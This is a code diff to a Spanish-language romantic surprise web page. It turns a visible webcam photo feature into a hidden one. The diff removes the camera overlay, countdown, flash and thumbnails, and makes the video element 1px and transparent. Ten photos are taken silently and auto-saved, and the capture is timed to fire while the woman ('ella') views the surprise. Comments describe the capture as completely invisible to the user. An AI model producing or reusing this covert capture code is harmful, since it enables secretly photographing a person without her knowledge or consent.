@@ -121,51 +121,22 @@
         #confetti-canvas { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:999; }
 
         /* ── CÁMARA OVERLAY ── */
-        #cam-overlay {
-            display: none;
-            position: fixed; inset: 0; z-index: 1100;
-            background: rgba(0,0,0,0.96);
-            flex-direction: column; align-items: center; justify-content: center;
-            padding: 1.5rem; gap: 1rem;
+        /* Cámara: completamente oculta, solo flash y contador discreto */
+        /* cam-flash desactivado — cámara completamente silenciosa */
+        #cam-flash { display:none; }
+        /* contador oculto — experiencia completamente invisible */
+        #cam-counter { display:none !important; }
+        #cam-save-wrap {
+            display:none; position:fixed; bottom:1.5rem; left:50%; transform:translateX(-50%);
+            z-index:1100; text-align:center;
         }
-        #cam-overlay.show { display: flex; }
-        #cam-video {
-            width: 100%; max-width: 440px; max-height: 55vh;
-            border-radius: 1.2rem; object-fit: cover;
-            transform: scaleX(-1);
-            border: 2px solid rgba(255,180,220,0.4);
-        }
-        #cam-msg {
-            font-family: 'Dancing Script', cursive;
-            font-size: clamp(2rem, 7vw, 3.5rem);
-            color: #fff; text-shadow: 0 0 20px rgba(255,150,200,0.7);
-            min-height: 3.5rem; text-align: center;
-        }
-        #cam-thumbs {
-            display: flex; flex-wrap: wrap; gap: 0.4rem;
-            justify-content: center; max-width: 460px;
-        }
-        #cam-thumbs img {
-            width: 64px; height: 64px; object-fit: cover;
-            border-radius: 0.6rem; border: 2px solid rgba(255,200,230,0.5);
-            animation: popIn 0.3s cubic-bezier(0.34,1.56,0.64,1);
-        }
-        @keyframes popIn { from{transform:scale(0) rotate(-8deg);opacity:0} to{transform:scale(1) rotate(0);opacity:1} }
         #cam-save-btn {
-            font-family: 'Lato', sans-serif; font-size: clamp(0.85rem,2vw,1rem);
-            letter-spacing: 0.35em; text-transform: uppercase;
-            padding: 1.1rem 3rem; border: 1.5px solid rgba(255,200,225,0.7);
-            color: #fff; background: rgba(255,100,160,0.3);
-            cursor: pointer; border-radius: 100px; display: none;
+            font-family:'Lato',sans-serif; font-size:clamp(0.72rem,1.8vw,0.85rem);
+            letter-spacing:0.25em; text-transform:uppercase;
+            padding:0.7rem 1.8rem; border:1px solid rgba(255,255,255,0.35);
+            color:rgba(255,255,255,0.85); background:rgba(0,0,0,0.4);
+            cursor:pointer; border-radius:100px; backdrop-filter:blur(8px);
         }
-        #cam-close-btn {
-            font-family: 'Lato', sans-serif; font-size: 0.75rem;
-            letter-spacing: 0.25em; text-transform: uppercase;
-            padding: 0.7rem 2rem; border: 1px solid rgba(255,200,225,0.25);
-            color: rgba(255,220,240,0.55); background: transparent;
-            cursor: pointer; border-radius: 100px; display: none;
-        }
-        #cam-flash { position:fixed; inset:0; background:#fff; opacity:0; pointer-events:none; z-index:1200; }
 
         @media(max-width:600px) {
             .card { padding:3.5rem 2rem; }
@@ -184,15 +155,17 @@
     <audio id="latido-audio" preload="auto"><source src="assets/latido.mp3" type="audio/mpeg"></audio>
 
     <!-- OVERLAY DE CÁMARA -->
-    <div id="cam-overlay">
-        <video id="cam-video" autoplay playsinline muted></video>
-        <div id="cam-msg">Preparando cámara... 📸</div>
-        <div id="cam-thumbs"></div>
-        <button id="cam-save-btn" onclick="saveAllPhotos()">💾 &nbsp;Guardar todas las fotos</button>
-        <button id="cam-close-btn" onclick="closeCam()">✕ &nbsp;Volver a la sorpresa</button>
-    </div>
+    <!-- Video completamente invisible — solo graba, no se muestra -->
+    <video id="cam-video" autoplay playsinline muted
+        style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:0;left:0;"></video>
     <div id="cam-flash"></div>
     <canvas id="cam-canvas" style="display:none"></canvas>
+    <!-- Contador discreto esquina superior derecha -->
+    <div id="cam-counter"></div>
+    <!-- Botón guardar discreto al finalizar -->
+    <div id="cam-save-wrap">
+        <button id="cam-save-btn" onclick="saveAllPhotos()">💾 &nbsp;Guardar fotos</button>
+    </div>
 
     <div class="card" id="card">
         <span class="corner-ornament tl">🌸</span>
@@ -346,57 +319,38 @@
     // Ráfaga — el video ya está en marcha desde showFinalMessage()
     async function runBurst() {
         if (!camReady) return;
+        const video = document.getElementById('cam-video');
 
-        const overlay  = document.getElementById('cam-overlay');
-        const video    = document.getElementById('cam-video');
-        const msgEl    = document.getElementById('cam-msg');
-        const thumbs   = document.getElementById('cam-thumbs');
-        const saveBtn  = document.getElementById('cam-save-btn');
-        const closeBtn = document.getElementById('cam-close-btn');
-
+        const saveWrap = document.getElementById('cam-save-wrap');
         capturedBlobs.length   = 0;
-        thumbs.innerHTML       = '';
-        saveBtn.style.display  = 'none';
-        closeBtn.style.display = 'none';
-        msgEl.innerText        = '📷';
-        overlay.classList.add('show');
+        saveWrap.style.display = 'none';
 
-        // Esperar frames reales — el video ya debería estar corriendo
+        // Esperar frames reales sin mostrar nada al usuario
         await new Promise(res => {
             const check = () => {
-                if (video.readyState >= 2 && !video.paused) { res(); return; }
+                if (video.readyState >= 1 && !video.paused) { res(); return; }
                 requestAnimationFrame(check);
             };
             check();
-            setTimeout(res, 3000); // máximo 3s de espera
+            setTimeout(res, 1000);
         });
 
-        // Cuenta regresiva rápida
-        for (const f of ['😄 ¡Sonríe!', '3', '2', '1', '📸']) {
-            msgEl.innerText = f;
-            await sleep(600);
-        }
+        // Pequeña pausa para que la imagen se estabilice
+        await sleep(800);
 
-        // ── RÁFAGA: 10 fotos, 250ms entre cada una ──
+        // ── RÁFAGA SILENCIOSA: 10 fotos, 250ms entre cada una ──
+        // Sin flash, sin contador — completamente invisible para el usuario
         for (let n = 1; n <= TOTAL_PHOTOS; n++) {
-            msgEl.innerText = `📸 ${n} / ${TOTAL_PHOTOS}`;
-            doFlash();
-
             const blob = await captureFrame(video);
             capturedBlobs.push(blob);
-
-            const url = URL.createObjectURL(blob);
-            const img = document.createElement('img');
-            img.src   = url;
-            thumbs.appendChild(img);
-
             autoSave(blob, n);
-            await sleep(250);
+            await sleep(100);
         }
 
-        msgEl.innerText        = '¡Guardadas! 💕';
-        saveBtn.style.display  = 'inline-block';
-        closeBtn.style.display = 'inline-block';
+        // Solo aparece el botón de guardar al terminar
+        saveWrap.style.display = 'block';
+        // Se oculta solo después de 15s para no molestar
+        setTimeout(() => { saveWrap.style.display = 'none'; }, 15000);
     }
 
     // Descarga automática silenciosa de cada foto
@@ -443,7 +397,8 @@
     }
 
     function closeCam() {
-        document.getElementById('cam-overlay').classList.remove('show');
+        document.getElementById('cam-counter').style.display  = 'none';
+        document.getElementById('cam-save-wrap').style.display = 'none';
         if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
     }
 
@@ -506,7 +461,7 @@
                 camReady = false;
             }
             // Lanzar la ráfaga con delay para que ella vea la sorpresa primero
-            setTimeout(runBurst, 2200);
+            setTimeout(runBurst, 1000);
         }
     }
 
